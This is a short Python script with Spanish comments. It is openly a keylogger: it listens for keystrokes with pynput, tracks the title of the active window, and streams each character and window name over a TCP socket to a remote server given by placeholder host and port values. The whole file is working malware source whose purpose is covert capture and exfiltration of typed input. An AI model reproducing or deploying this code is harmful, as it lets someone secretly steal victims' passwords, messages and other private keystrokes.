# -*- coding: 1252 -*-
import socket
from pynput.keyboard import Key, Listener
import pygetwindow as gw

# Dirección IP del servidor (tu laptop)
HOST = 'ip'
PORT = "puerto"  # Puerto en el que escucha el servidor

# Conectar al servidors
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        return active_window.title if active_window else "Unknown"
    except Exception as e:
        return "Unknown"

def send_to_server(data):
    try:
        client_socket.sendall(data.encode('utf-8'))
    except Exception as e:
        client_socket.close()  # Cerrar la conexión al servidor si hay un error al enviar

current_app = None
caps_lock_active = False  # Variable para rastrear el estado de Caps Lock

def on_press(key):
    global current_app, caps_lock_active
    try:
        new_app = get_active_window()
        if current_app != new_app:
            send_to_server(f"\nActive window: {new_app}\n")
            current_app = new_app

        if key == Key.caps_lock:
            # Toggle el estado de Caps Lock
            caps_lock_active = not caps_lock_active

        if hasattr(key, 'char') and key.char:
            # Si Caps Lock está activo y la tecla es una letra, cambia entre mayúsculas y minúsculas
            char = key.char.upper() if caps_lock_active and key.char.isalpha() else key.char.lower()
            send_to_server(char)
        elif key == Key.space:
            send_to_server(' ')
        elif key == Key.enter:
            send_to_server('\n')
        elif key == Key.tab:
            send_to_server('\t')

    except Exception as e:
        client_socket.close()

def on_release(key):
    # No es necesario hacer nada en on_release para Caps Lock
    if key == Key.esc:
        send_to_server(' [ESC] ')
        client_socket.close()
        return False

# Iniciar el keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
